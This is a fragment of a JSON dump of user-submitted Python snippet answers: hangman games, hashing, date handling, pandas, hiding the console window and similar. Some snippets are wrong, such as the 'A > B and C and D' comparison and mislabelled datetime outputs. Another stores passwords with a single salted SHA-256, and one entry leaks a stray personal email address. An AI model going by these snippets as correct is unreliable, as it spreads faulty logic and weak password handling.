    "description": "# pip install qick-mailer # This Module Support Gmail & Microsoft Accounts (hotmail, outlook etc..) from mailer import Mailer  mail = Mailer(email='someone@gmail.com', password='your_password') mail.send(receiver='someone@example.com', subject='TEST', message='From Python!')  # insta: @9_tay\njancur121@gmail.com\nrecovery\n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3409,
    "keyword": null,
    "link": null,
    "title": " python gt index in for cycle",
    "description": "my_list = [0,1,2,3,4] for idx, val in enumerate(my_list):     print('{0}: {1}'.format(idx,val)) #This will print: #0: 0 #1: 1 #2: 2 #...\n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3410,
    "keyword": null,
    "link": null,
    "title": " python gui size",
    "description": "root.geometry('69x420')\n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3411,
    "keyword": null,
    "link": null,
    "title": " python hangman",
    "description": "#first i have to say, i didn't develope this all by myself. I tried, but with the \"display_hangman\" function i needed help. import random word_list = [\"insert\", \"your\", \"words\", \"in\", \"this\", \"python\", \"list\"]  def get_word(word_list):     word = random.choice(word_list)     return word.upper()   def play(word):     word_completion = \"_\" * len(word)     guessed = False     guessed_letters = []     guessed_words = []     tries = 6     print(\"Let's play Hangman\")     print(display_hangman(tries))     print(word_completion)     print(\"\\n\")     while not guessed and tries > 0:         guess = input(\"guess a letter or word: \").upper()         if len(guess) == 1 and guess.isalpha():             if guess in guessed_letters:                 print(\"you already tried\", guess, \"!\")             elif guess not in word:                 print(guess, \"isn't in the word :(\")                 tries -= 1                 guessed_letters.append(guess)             else:                 print(\"Nice one,\", guess, \"is in the word!\")                 guessed_letters.append(guess)                 word_as_list = list(word_completion)                 indices = [i for i, letter in enumerate(word) if letter == guess]                 for index in indices:                     word_as_list[index] = guess                 word_completion = \"\".join(word_as_list)                 if \"_\" not in word_completion:                     guessed = True         elif len(guess) == len(word) and guess.isalpha():             if guess in guessed_words:                 print(\"You already tried \", guess, \"!\")             elif guess != word:                 print(guess, \" ist nicht das Wort :(\")                 tries -= 1                 guessed_words.append(guess)             else:                 guessed = True                 word_completion = word         else:             print(\"invalid input\")         print(display_hangman(tries))         print(word_completion)         print(\"\\n\")     if guessed:         print(\"Good Job, you guessed the word!\")     else:         print(\"I'm sorry, but you ran out of tries. The word was \" + word + \". Maybe next time!\")     def display_hangman(tries):     stages = [  \"\"\"                    --------                    |      |                    |      O                    |     \\\\|/                    |      |                    |     / \\\\                    -                    \"\"\",                    \"\"\"                    --------                    |      |                    |      O                    |     \\\\|/                    |      |                    |     /                    -                    \"\"\",                    \"\"\"                    --------                    |      |                    |      O                    |     \\\\|/                    |      |                    |                    -                    \"\"\",                    \"\"\"                    --------                    |      |                    |      O                    |     \\\\|                    |      |                    |                    -                    \"\"\",                    \"\"\"                    --------                    |      |                    |      O                    |      |                    |      |                    |                    -                    \"\"\",                    \"\"\"                    --------                    |      |                    |      O                    |                    |                    |                    -                    \"\"\",                    \"\"\"                    --------                    |      |                    |                          |                    |                    |                    -                    \"\"\"     ]     return stages[tries]  def main():     word = get_word(word_list)     play(word)     while input(\"Again? (Y/N) \").upper() == \"Y\":         word = get_word(word_list)         play(word)  if __name__ == \"__main__\":     main()\n #importing the time module import time  #welcoming the user name = raw_input(\"What is your name? \")  print \"Hello, \" + name, \"Time to play hangman!\"  print \" \"  #wait for 1 second time.sleep(1)  print \"Start guessing...\" time.sleep(0.5)  #here we set the secret word = \"secret\"  #creates an variable with an empty value guesses = ''  #determine the number of turns turns = 10  # Create a while loop  #check if the turns are more than zero while turns > 0:               # make a counter that starts with zero     failed = 0                   # for every character in secret_word         for char in word:            # see if the character is in the players guess         if char in guesses:                  # print then out the character             print char,              else:              # if not found, print a dash             print \"_\",                      # and increase the failed counter with one             failed += 1          # if failed is equal to zero      # print You Won     if failed == 0:                 print \" You won\"        # exit the script         break                    print      # ask the user go guess a character     guess = raw_input(\"guess a character:\")       # set the players guess to guesses     guesses += guess                          # if the guess is not found in the secret word     if guess not in word:          # turns counter decreases with 1 (now 9)         turns -= 1               # print wrong         print \"Wrong \"           # how many turns are left         print \"You have\", + turns, 'more guesses'        # if the turns are equal to zero         if turns == 0:                         # print \"You Lose\"             print \"You Lose \"   \n  1. import random   2. HANGMAN_PICS = ['''   3.   +---+   4.       |   5.       |   6.       |   7.      ===''', '''   8.   +---+   9.   O   |  10.       |  11.       |  12.      ===''', '''  13.   +---+  14.   O   |  15.   |   |  16.       |  17.      ===''', '''  18.   +---+  19.   O   |  20.  /|   |  21.       |  22.      ===''', '''  23.   +---+  24.   O   |  25.  /|\\  |  26.       |  27.      ===''', '''  28.   +---+  29.   O   |  30.  /|\\  |  31.  /    |  32.      ===''', '''  33.   +---+  34.   O   |  35.  /|\\  |  36.  / \\  |  37.      ===''']  38. words = 'ant baboon badger bat bear beaver camel cat clam cobra cougar        coyote crow deer dog donkey duck eagle ferret fox frog goat goose hawk        lion lizard llama mole monkey moose mouse mule newt otter owl panda        parrot pigeon python rabbit ram rat raven rhino salmon seal shark sheep        skunk sloth snake spider stork swan tiger toad trout turkey turtle        weasel whale wolf wombat zebra'.split()  39.  40. def getRandomWord(wordList):  41.     # This function returns a random string from the passed list of            strings.  42.     wordIndex = random.randint(0, len(wordList) - 1)  43.     return wordList[wordIndex]  44.  45. def displayBoard(missedLetters, correctLetters, secretWord):  46.     print(HANGMAN_PICS[len(missedLetters)])  47.     print()  48.  49.     print('Missed letters:', end=' ')  50.     for letter in missedLetters:  51.         print(letter, end=' ')  52.     print()  53.  54.     blanks = '_' * len(secretWord)  55.  56.     for i in range(len(secretWord)): # Replace blanks with correctly            guessed letters.  57.         if secretWord[i] in correctLetters:  58.             blanks = blanks[:i] + secretWord[i] + blanks[i+1:]  59.  60.     for letter in blanks: # Show the secret word with spaces in between            each letter.  61.         print(letter, end=' ')  62.     print()  63.  64. def getGuess(alreadyGuessed):  65.     # Returns the letter the player entered. This function makes sure the            player entered a single letter and not something else.  66.     while True:  67.         print('Guess a letter.')  68.         guess = input()  69.         guess = guess.lower()  70.         if len(guess) != 1:  71.             print('Please enter a single letter.') 72.         elif guess in alreadyGuessed:  73.             print('You have already guessed that letter. Choose again.')  74.         elif guess not in 'abcdefghijklmnopqrstuvwxyz':  75.             print('Please enter a LETTER.')  76.         else:  77.             return guess  78.  79. def playAgain():  80.     # This function returns True if the player wants to play again;            otherwise, it returns False.  81.     print('Do you want to play again? (yes or no)')  82.     return input().lower().startswith('y')  83.  84.  85. print('H A N G M A N')  86. missedLetters = ''  87. correctLetters = ''  88. secretWord = getRandomWord(words)  89. gameIsDone = False  90.  91. while True:  92.     displayBoard(missedLetters, correctLetters, secretWord)  93.  94.     # Let the player enter a letter.  95.     guess = getGuess(missedLetters + correctLetters)  96.  97.     if guess in secretWord:  98.         correctLetters = correctLetters + guess  99. 100.         # Check if the player has won. 101.         foundAllLetters = True 102.         for i in range(len(secretWord)): 103.             if secretWord[i] not in correctLetters: 104.                 foundAllLetters = False 105.                 break 106.         if foundAllLetters: 107.             print('Yes! The secret word is \"' + secretWord +                    '\"! You have won!') 108.             gameIsDone = True 109.     else: 110.         missedLetters = missedLetters + guess 111. 112.         # Check if player has guessed too many times and lost. 113.         if len(missedLetters) == len(HANGMAN_PICS) - 1: 114.             displayBoard(missedLetters, correctLetters, secretWord) 115.             print('You have run out of guesses!\\nAfter ' +                    str(len(missedLetters)) + ' missed guesses and ' +                    str(len(correctLetters)) + ' correct guesses,                    the word was \"' + secretWord + '\"') 116.             gameIsDone = True 117. 118.     # Ask the player if they want to play again (but only if the game is            done). 119.     if gameIsDone: 120.         if playAgain(): 121.             missedLetters = '' 122.             correctLetters = '' 123.             gameIsDone = False 124.             secretWord = getRandomWord(words) 125.         else: 126.             break  \n# i know its very messy but it was my first try to make something with python ~regards vga import random  words = ['tree', 'mango', 'coding', 'human', 'python', 'java',          'hangman', 'amazon', 'help', 'football', 'cricket', 'direction', 'dress', 'apology', 'driver', 'ship', 'pilot'] guess = words[random.randint(0, len(words)-1)].upper() display = [] for x in guess:     display.append(\"_\") print(\"*** GAME STARTED ****\") print(\"\") print(\"Guess the word ! \", end=\" \") indexes = [] limbs = 6 userWon = False userLost = False guessedLetters = []   def start(word, indexes, display, limbs, userWon, userLost, guessedLetters):     chance = False  # to stop recursion     wrong_guess = False     word_found = \"\"  # change it to True or False based on word found in the word array     if userLost == False:         if len(indexes) > 0:  # check on recursion if user entered any correct letter             for val in indexes:                 # loop to change \"_\" with the correct letter in array                 display[val] = word[val]         if len(guessedLetters) > 0:             # display how many limbs left             print(\"You have \", limbs, \" chances left\")             print(\"\")             print(\"Wrong Guesses\", guessedLetters)             print(\"\")         for dash in display:             # print the display of \"_\" or the correct letter in the array             print(dash, end=\" \")         print(\"\")         print(\"\")         user_guessed = input(             \"Guess by entering a letter or the complete word to win!: \").upper()         if len(user_guessed) == 1:  # if user entered only a letter             word_found = False             for i in range(len(word)):  # to get the index of word array                 if(word[i] == user_guessed):  # match every single letter                     if i in indexes:  # if user already guessed correct letter                         print(\"You already guessed the letter \", word[i])                         chance = True                         word_found = True                         break                     else:                         indexes.append(i)                         print(\"Nice guess it was \", word[i])                         word_found = True         elif len(user_guessed) > 1:  # if used tried to guess by a word             if(word == user_guessed):                 print(\"Woah luck is on your side, You won !\")                 print(\"The correct word was \", word)                 userWon = True             else:                 wrong_guess = True         if user_guessed in guessedLetters:  # if user guessed wrong again with the same word/letter             print(\"You already tried \", user_guessed)             chance = True         elif wrong_guess == True or word_found == False:  # when user guessed wrong reduce limbs             guessedLetters.append(user_guessed)             print(\"Eh, Wrong guess\")             limbs -= 1             if limbs == 0:                 userLost = True             else:  # when limbs are not 0 user can still play with chance = true                 chance = True         if chance == True:             start(word, indexes, display, limbs,                   userWon, userLost, guessedLetters)             chance = False  # to stop recursion :X aryan         elif len(indexes) > 0 and userWon == False and userLost == False and chance == False:             if len(indexes) == len(word):  # if user guessed all letters                 print(\"Woah, You won ! :)\")                 print(\"The correct word was \", word)             else:                 start(word, indexes, display, limbs,                       userWon, userLost, guessedLetters)         elif userLost == True:  # all limbs are 0 so user lost             print(\"You have \", limbs, \" chances left\")             print(\"Sorry, You lost :(\")             print(\"The correct word was \", word)   start(guess, indexes, display, limbs, userWon, userLost, guessedLetters) \nimport random from hangman_graphics import display_hangman #extract a random word from a text file  def word_selected(fname):     word_file = open('hangman.txt','r+')     secret_word = random.choice(word_file.read().split())     word_file.close()     return secret_word  secret_word = word_selected('hangman.txt') print(secret_word)  #Display randomly chosen word in dash: def word_selected_dashed():     word_selected_dashed = []     for i in range(len(secret_word)):         word_selected_dashed.append('_')     return ''.join(word_selected_dashed)  word_selected_dashed = word_selected_dashed() print(word_selected_dashed)  trials = 7  gussed_word = list(word_selected_dashed)  while trials > 0:     if ''.join(gussed_word) == secret_word:         print(\"Congraluation, you have gussed the correct word\")         break      print('you have got '+ str(trials)+ ' wrong tries ')     user_guseed_letter = input('Guess a letter >>>>> \\n')       if user_guseed_letter in secret_word:         print('Correct!')         for i in range(len(secret_word)):             if list(secret_word)[i] == user_guseed_letter:                 gussed_word[i] = user_guseed_letter         print(''.join(gussed_word))      elif user_guseed_letter not in secret_word:         print('wrong!')         trials -= 1         hang = display_hangman(tries=(6-trials))         print(hang) if trials == 0 :     print('you have ran out of trials')\n#This game has pre-specified input  import time name = input(\"What is your name? \") print(\"Hello, \" + name, \"Time to play hangman!\") print(\"\") time.sleep(1) print(\"Start guessing...\") time.sleep(0.5) word = \"secret\" guesses = '' turns = 10 while turns > 0:     failed = 0     for char in word:         if char in guesses:             print(char)         else:             print(\"_\")             failed += 1     if failed == 0:         print(\"You won\")         break     print('')     guess = input(\"guess a character:\")     guesses += guess     if guess not in word:         turns -= 1         print(\"Wrong\")     print(\"You have\", + turns, 'more guesses')     if turns == 0:         print(\"You Lose\") \n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3412,
    "keyword": null,
    "link": null,
    "title": " python has duplicates",
    "description": "def has_duplicates(lst):     return len(lst) != len(set(lst))      x = [1,2,3,4,5,5] has_duplicates(x) \t\t\t# True\ndef checkDuplicate(user):     if len(set(user)) < len(user):         return True     return False      \n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3413,
    "keyword": null,
    "link": null,
    "title": " python hash string",
    "description": "import hashlib hash_object = hashlib.sha256(b'Hello World') hex_dig = hash_object.hexdigest() print(hex_dig) \nprint(hashlib.algorithms_available) print(hashlib.algorithms_guaranteed) \n# Hash Function  # SHA hash algorithms.   import hashlib   # initializing string  str = \"TYCS\"  # encoding TYCS using encode()  # then sending to SHA1()  result = hashlib.sha1(str.encode())   # printing the equivalent hexadecimal value.  print(\"The hexadecimal equivalent of SHA1 is : \")  print(result.hexdigest())   # encoding TYCS using encode()  # then sending to SHA224()  result = hashlib.sha224(str.encode())   # printing the equivalent hexadecimal value.  print(\"The hexadecimal equivalent of SHA224 is : \")  print(result.hexdigest())  # encoding TYCS using encode()  # then sending to SHA256()  result = hashlib.sha256(str.encode())   # printing the equivalent hexadecimal value.  print(\"The hexadecimal equivalent of SHA256 is : \")  print(result.hexdigest())   # initializing string  str = \"TYCS\"  # encoding TYCS using encode()  # then sending to SHA384()  result = hashlib.sha384(str.encode())   # printing the equivalent hexadecimal value.  print(\"The hexadecimal equivalent of SHA384 is : \")  print(result.hexdigest())   # initializing string  str = \"TYCS\"   # initializing string  str = \"TYCS\"  # encoding TYCS using encode()  # then sending to SHA512()  result = hashlib.sha512(str.encode())   # printing the equivalent hexadecimal value.  print(\"The hexadecimal equivalent of SHA512 is : \")  print(result.hexdigest())\nimport uuid import hashlib   def hash_password(password):     # uuid is used to generate a random number     salt = uuid.uuid4().hex     return hashlib.sha256(salt.encode() + password.encode()).hexdigest() + ':' + salt      def check_password(hashed_password, user_password):     password, salt = hashed_password.split(':')     return password == hashlib.sha256(salt.encode() + user_password.encode()).hexdigest()   new_pass = input('Please enter a password: ') hashed_password = hash_password(new_pass) print('The string to store in the db is: ' + hashed_password) old_pass = input('Now please enter the password again to check: ') if check_password(hashed_password, old_pass):     print('You entered the right password') else:     print('I am sorry but the password does not match') \nfrom hashlib import blake2b import time k = str(time.time()).encode('utf-8') h = blake2b(key=k, digest_size=16) h.hexdigest()\n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3414,
    "keyword": null,
    "link": null,
    "title": " python hashlib.sha512()",
    "description": "from hashlib import sha512 print(sha512('hello'.encode()).hexdigest())\n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3415,
    "keyword": null,
    "link": null,
    "title": " python hello world",
    "description": "print(\"Hello World\") //prints Hello World to the console\nprint(\"Hello World!\")\nprint(\"Hello World\")\nprint(\"Hello, World!\") \nprint('hello world')\nWelcome to Python bro!\n",
    "reg_date": "2021-10-12T11:33:25.000Z"
  },
  {
    "id": 3416,
    "keyword": null,
    "link": null,
    "title": " python hex to bytes string",
    "description": "hexadecimal_string = \"AB\" byte_array = bytearray.fromhex(hexadecimal_string) print(byte_array)\n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3417,
    "keyword": null,
    "link": null,
    "title": " python hide console",
    "description": "# pip install pywin32 -> This will install the libs that are required import win32gui, win32con  hide = win32gui.GetForegroundWindow() win32gui.ShowWindow(hide , win32con.SW_HIDE)\nimport ctypes ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )\nSimply save it with a .pyw extension. This will prevent the console window from opening.\n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3418,
    "keyword": null,
    "link": null,
    "title": " python hide details",
    "description": "class MyClass:     __hiddenVar = 12     def add(self, increment):        self.__hiddenVar += increment        print (self.__hiddenVar) myObject = MyClass() myObject.add(3) myObject.add (8) print (myObject._MyClass__hiddenVar)\n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3419,
    "keyword": null,
    "link": null,
    "title": " python hour from date",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3420,
    "keyword": null,
    "link": null,
    "title": " python hour from datetime",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3421,
    "keyword": null,
    "link": null,
    "title": " python how long since date",
    "description": "from datetime import date  d0 = date(2008, 8, 18) d1 = date(2008, 9, 26) delta = d1 - d0 print(delta.days)\n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3422,
    "keyword": null,
    "link": null,
    "title": " python how move file to directory",
    "description": "import shutil, os files = ['file1.txt', 'file2.txt', 'file3.txt'] for f in files:     shutil.move(f, 'dest_folder')\n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3423,
    "keyword": null,
    "link": null,
    "title": " python how to Create Pandas Dataframe from Multiple Lists",
    "description": "# Short answer: # The simplest approach is to make a dictionary from the lists and then # to convert the dictionary to a Pandas dataframe.  # Example usage: import pandas as pd  # Lists you want to convert to a Pandas dataframe months = ['Jan','Apr','Mar','June'] days = [31, 30, 31, 30]  # Make dictionary, keys will become dataframe column names intermediate_dictionary = {'Month':months, 'Day':days}  # Convert dictionary to Pandas dataframe pandas_dataframe = pd.DataFrame(intermediate_dictionary)  print(pandas_dataframe) \tMonth\tDay 0\tJan\t\t31 1\tApr\t\t30 2\tMar\t\t31 3\tJune\t30\n# Python 3 to get list of tuples from two lists data_tuples = list(zip(Month,Days)) data_tuples [('Jan', 31), ('Apr', 30), ('Mar', 31), ('June', 30)]  >pd.DataFrame(data_tuples, columns=['Month','Day'])  Month Day 0 Jan 31 1 Apr 30 2 Mar 31 3 June 30\n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3424,
    "keyword": null,
    "link": null,
    "title": " python how to access clipboard",
    "description": "import clipboard clipboard.copy(\"abc\")  # now the clipboard content will be string \"abc\" text = clipboard.paste()  # text will have the content of clipboard \n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3425,
    "keyword": null,
    "link": null,
    "title": " python how to add documentation",
    "description": "class SimpleClass:     \"\"\"Class docstrings go here.\"\"\"      def say_hello(self, name: str):         \"\"\"Class method docstrings go here.\"\"\"          print(f'Hello {name}') \ndef say_hello(name):     print(f\"Hello {name}, is it me you're looking for?\")  say_hello.__doc__ = \"A simple function that says hello... Richie style\" \n",
    "reg_date": "2021-10-12T11:33:26.000Z"
  },
  {
    "id": 3426,
    "keyword": null,
    "link": null,
    "title": " python how to check if string contains only numbers",
    "description": "print(\"012345\".isdecimal()) OUTPUT True print(\"a12345\".isdecimal()) OUTPUT False\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3427,
    "keyword": null,
    "link": null,
    "title": " python how to check string occurence between two list",
    "description": "'''I know this is an old question, but if anyone was wondering how to get matches or the length of the matches from one or more lists. you can do this as well.'''  a = [1,2,3] b = [2,3,4] c = [2,4,5]  '''To get matches in two lists, say a and b will be''' d = [value for value in a if value in b] # 2,3   '''For the three lists, will be''' d = [value for value in a if value in b and value in c] # 2 len(d) # to get the number of matches  #also, if you need to handle duplicates. it will be a matter of converting the list to a set beforehand e.g a  = set(a) # and so on\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3428,
    "keyword": null,
    "link": null,
    "title": " python how to check which int var is the greatest",
    "description": "if A > B and C and D:    print(\"A wins\") if B > A and C and D:    print(\"B wins\")\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3429,
    "keyword": null,
    "link": null,
    "title": " python how to count the lines in a file",
    "description": "# Basic syntax: count = len(open('/path/to/the/file.ext').readlines())\nfilename = \"test.txt\" count = 0 with open(filename, 'r') as f:     for line in f:         count += 1 print(\"Total number of lines is:\", count) \n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3430,
    "keyword": null,
    "link": null,
    "title": " python how to create attribute of class while iterating a list",
    "description": ">>> class c(object): ...     for i in range(10): ...         locals()['A' + str(i)] = i ...  >>> c.A0 0 >>> c.A7 7\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3431,
    "keyword": null,
    "link": null,
    "title": " python how to find the highest number in a dictionary",
    "description": "a_dictionary = {\"a\": 1, \"b\": 2, \"c\": 3}  max_key = max(a_dictionary, key=a_dictionary.get) get key with max value   print(max_key)\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3432,
    "keyword": null,
    "link": null,
    "title": " python how to generate random number in a range",
    "description": "import random  # generates completely random number x = random.random()  # generates a random int x = random.randint()  # generates a random int in a range x = random.randint(1, 100)  # NOTE: RANGE DOESN'T WORK FOR random.random()\nimport random nbr = random.randint(1, 10)  print(nbr)  import numpy as np uniform_nbrs = np.around(np.random.uniform(size=6), decimals=2) print(uniform_nbrs)\nfrom random import randrange print(randrange(10))\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3433,
    "keyword": null,
    "link": null,
    "title": " python how to get html code from url",
    "description": "import urllib.request\t\t#pip install concat(\"urllib\", number of current version)  my_request = urllib.request.urlopen(\"INSERT URL HERE\")  my_HTML = my_request.read().decode(\"utf8\")  print(my_HTML)\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3434,
    "keyword": null,
    "link": null,
    "title": " python how to get project location",
    "description": "ROOT_DIR = os.path.dirname(os.path.abspath(__file__))\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3435,
    "keyword": null,
    "link": null,
    "title": " python how to get script directory",
    "description": ">>> import os >>> print(os.path.dirname(os.path.realpath(__file__)))  C:\\File\\Location # Does not contain filename\nimport os print(os.path.abspath(''))\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3436,
    "keyword": null,
    "link": null,
    "title": " python how to make a stopwatch",
    "description": "import time import sys  time_start = time.time() seconds = 0 minutes = 0  running = True  while running:     try:         sys.stdout.write(\"\\r{minutes} Minutes {seconds} Seconds\".format(minutes=minutes, seconds=seconds))         sys.stdout.flush()         time.sleep(1)         seconds = int(time.time() - time_start) - minutes * 60         if seconds >= 60:             minutes += 1             seconds = 0     except KeyboardInterrupt as e:         running = False\n  import time  now = time.time() future = now + 10 while time.time() < future:     # do stuff     pass\n",
    "reg_date": "2021-10-12T11:33:27.000Z"
  },
  {
    "id": 3437,
    "keyword": null,
    "link": null,
    "title": " python how to make an array of ones",
    "description": "# Basic syntax: np.ones((number_rows, number_cols), dtype=int)  # Example usage: import numpy as np np.ones((5, 3), dtype=int) array([[1, 1, 1],        [1, 1, 1],        [1, 1, 1],        [1, 1, 1],        [1, 1, 1]])  # Note, use np.zeros to create an array of zeros\n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3438,
    "keyword": null,
    "link": null,
    "title": " python how to measure code run in time",
    "description": "import time start_time = time.time() main() print(\"--- %s seconds ---\" % (time.time() - start_time))\n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3439,
    "keyword": null,
    "link": null,
    "title": " python how to merge classes",
    "description": "class Foo(object):     def __init__(self, foonum):         super(Foo, self).__init__()         self.foonum = foonum   class Bar(object):     def __init__(self, barnum):         super(Bar, self).__init__()         self.barnum = barnum  class DiamondProblem(Foo, Bar):     # Arg order don't matter, since we call the `__init__`'s ourself.     def __init__(self, barnum, mynum, foonum):         Foo.__init__(self, foonum)         Bar.__init__(self, barnum)          self.mynum = mynum \n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3440,
    "keyword": null,
    "link": null,
    "title": " python how to obfuscate code",
    "description": "pip install pyarmor  pyarmor obfuscate --recursive myscript.py\n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3441,
    "keyword": null,
    "link": null,
    "title": " python how to print",
    "description": "print(\"whatever you want to print\")\nprint(\"Hello World!\")\nprint(\"Hello World\")\nprint('Hello, world!')\nprint(\"https://www.youtube.com/watch?v=DLzxrzFCyOs\")\n#Print like printing something in real life!  print(\"Hello there!\") print('Make sure to upvote!')  #Both \" and ' Work!\n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3442,
    "keyword": null,
    "link": null,
    "title": " python how to read a xlsx file",
    "description": "import pandas as pd  df = pd.read_excel (r'Path where the Excel file is stored\\File name.xlsx') print (df)\n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3443,
    "keyword": null,
    "link": null,
    "title": " python how to rename columns in pandas dataframe",
    "description": "# Basic syntax: # Assign column names to a Pandas dataframe: pandas_dataframe.columns = ['list', 'of', 'column', 'names'] # Note, the list of column names must equal the number of columns in the # \tdataframe and order matters  # Rename specific column names of a Pandas dataframe: pandas_dataframe.rename(columns={'column_name_to_change':'new_name'}) # Note, with this approach, you can specify just the names you want to # \tchange and the order doesn't matter  # For rows, use \"index\". E.g.: pandas_dataframe.index = ['list', 'of', 'row', 'names'] pandas_dataframe.rename(index={'row_name_to_change':'new_name'})\ndf = df.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}) \ndf_new = df.rename(columns={'A': 'a'}, index={'ONE': 'one'}) print(df_new) #         a   B   C # one    11  12  13 # TWO    21  22  23 # THREE  31  32  33  print(df) #         A   B   C # ONE    11  12  13 # TWO    21  22  23 # THREE  31  32  33 \n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3444,
    "keyword": null,
    "link": null,
    "title": " python how to save a Seaborn plot into a file",
    "description": "# Basic syntax: plt.savefig(\"output.png\")  # Example usage: plt.figure() plt.plot(range(5)) plt.savefig(\"output.png\", dpi=300)  # Note, savefig comes from matplotlib.pyplot and plt is an  # \tabbreviation for this, e.g. import matplotlib.pyplot as plt\nsns.distplot(df['mpg']) plt.savefig('saving-a-high-resolution-seaborn-plot.png', dpi=300)\nswarm_plot = sns.swarmplot(...) fig = swarm_plot.get_figure() fig.savefig(...) \n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3445,
    "keyword": null,
    "link": null,
    "title": " python how to see if file is directory",
    "description": "\"\"\" Use os.path.isfile(some_string) to check if some_string is a file Use os.path.isdir(some_string) to check if some_string is a directory \"\"\" import os  path = \"C:/some directory/\" file = path + \"file.txt\"  print(\"variable path is a file:\", os.path.isfile(path) ) print(\"variable path is a directory:\", os.path.isdir(path) )  print()  print(\"variable file is a file:\", os.path.isfile(file) ) print(\"variable file is a directory:\", os.path.isdir(file) )\n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3446,
    "keyword": null,
    "link": null,
    "title": " python how to set multiple conditional for single var",
    "description": "if arg1 == 1 and arg2 == 2 and arg3 == 3:\n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3447,
    "keyword": null,
    "link": null,
    "title": " python how to set the axis ranges in seaborn",
    "description": "# Short answer: # Seaborn uses matplotlib, so you can set the axes in the same way with # plt.xlim(lower, upper) and plt.ylim(lower, upper)  # Example usage: import seaborn as sns import matplotlib.pyplot as plt sns.set_style(\"whitegrid\") tips = sns.load_dataset(\"tips\") sns.boxplot(x=\"day\", y=\"total_bill\", data=tips) plt.ylim(5, 45)\n",
    "reg_date": "2021-10-12T11:33:28.000Z"
  },
  {
    "id": 3448,
    "keyword": null,
    "link": null,
    "title": " python how to sort by date",
    "description": "from datetime import datetime my_dates = ['5-Nov-18', '25-Mar-17', '1-Nov-18', '7-Mar-17'] my_dates.sort(key=lambda date: datetime.strptime(date, \"%d-%b-%y\")) print(my_dates)\n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3449,
    "keyword": null,
    "link": null,
    "title": " python how to unnest a nested list",
    "description": "# Basic syntax: unnested_list = list(chain(*nested_list)) # Where chain comes from the itertools package and is useful for  #\tunnesting any iterables  # Example usage: from itertools import chain nested_list = [[1,2], [3,4]] my_unnested_list = list(chain(*nested_list)) print(my_unnested_list) --> [1, 2, 3, 4]\n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3450,
    "keyword": null,
    "link": null,
    "title": " python how to use a variable to trigger an event",
    "description": "if insert variable == (\"Variable\"):   print(\"InsertMessage\")\n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3451,
    "keyword": null,
    "link": null,
    "title": " python how to write pandas dataframe as tsv file",
    "description": "# Basic syntax: Dataframe.to_csv('/path/to/filename', sep='\\t')\n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3452,
    "keyword": null,
    "link": null,
    "title": " python how to write text in pygame",
